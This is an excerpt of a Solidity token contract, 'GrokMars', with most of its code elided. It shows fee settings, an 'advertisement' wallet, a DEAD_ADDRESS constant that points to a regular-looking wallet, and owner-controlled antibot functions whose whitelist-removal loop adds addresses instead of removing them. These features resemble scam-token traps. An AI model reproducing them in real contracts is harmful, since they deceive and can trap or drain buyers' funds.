...
contract GrokMars is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 100000*1e4* 10**18;
    ...
    uint256 public _buyAdvestisementFee = 2;
 
    uint256 public _sellTaxFee = 1;
    uint256 public _sellAdvestisementFee = 2;
    ...
    address public  advertisementWallet = 0x6074F6f992f5713df36C8A65DAff8215E53bA9E7;
 
 
    uint256 public _advestisementFee = _buyAdvestisementFee;
    uint256 private _previousAdvestisementFee = _advestisementFee;
 
    address public constant DEAD_ADDRESS = 0x0c27932EE23222Cb5bAEDfeB7E432E83c2097b86;
 
    uint256 public _maxTxAmount = 1000*1e6  * 10**18;
    ...
    constructor () public {
        ...
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //main 
    ...
    function turnOnAntibotMode() public onlyOwner {
        isAntibotModeEnabled = true;
    }
    ...
    function setAntibotModeWhitelist(address[] memory toAddAddesses, address[] memory toRemoveAddesses) public onlyOwner {
        ...
        for (uint256 i = 0; i < toRemoveAddesses.length; i++) antibotModeWhitelist[toRemoveAddesses[i]] = true;
    }
